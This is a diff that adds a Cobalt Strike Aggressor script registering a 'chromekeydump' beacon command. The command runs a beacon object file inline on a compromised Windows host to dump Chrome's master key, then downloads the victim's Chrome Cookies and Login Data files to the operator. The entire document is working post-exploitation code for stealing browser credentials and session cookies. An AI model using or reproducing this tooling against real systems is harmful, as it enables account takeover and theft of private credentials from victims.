@@ -1,0 +1,46 @@
+alias chromekeydump {
+    $bid = $1;
+    $command = $2;
+
+    $arch = binfo($bid, "barch");
+    $username = split(" ", binfo($bid, "user"))[0];
+    $args = "";
+	
+	if ($arch eq "x64") {
+        $handle = openf(script_resource("./bin/ChromeKeyDump.x64.o"));
+        $data = readb($handle, -1);
+        closef($handle);
+    } else {
+        $handle = openf(script_resource("./bin/ChromeKeyDump.o"));
+        $data = readb($handle, -1);
+        closef($handle);
+    }
+
+    if ($command eq "masterkey") {
+        btask($bid, "Tasked to dump Chrome Masterkey");
+        beacon_inline_execute($bid, $data, "go", $args);
+    } else if ($command eq "cookies") {
+        btask($bid, "Tasked to download Chrome Cookies file");
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies");    
+    } else if ($command eq "logindata") {
+        btask($bid, "Tasked to download Chrome LoginData file");
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");    
+    }else if ($command eq "all") {
+        btask($bid, "Tasked to dump Chrome Masterkey and download Cookies/LoginData");
+        beacon_inline_execute($bid, $data, "go", $args);
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies");
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");  
+    } else {
+        berror($bid, "Check parameters: help chromekeydump\n");
+        return;
+    }
+}
+
+beacon_command_register("chromekeydump", "Dump Chrome Masterkey and download Cookies/LoginData", 
+"\nUsage: chromekeydump [argument(required)]\n
+                Arguments       Description
+                ---------       -----------
+                masterkey       Dump Masterkey
+                cookies         Download Chrome Cookies file
+                logindata       Download Chrome Login Data file
+                all             Dump Masterkey and download files\n");
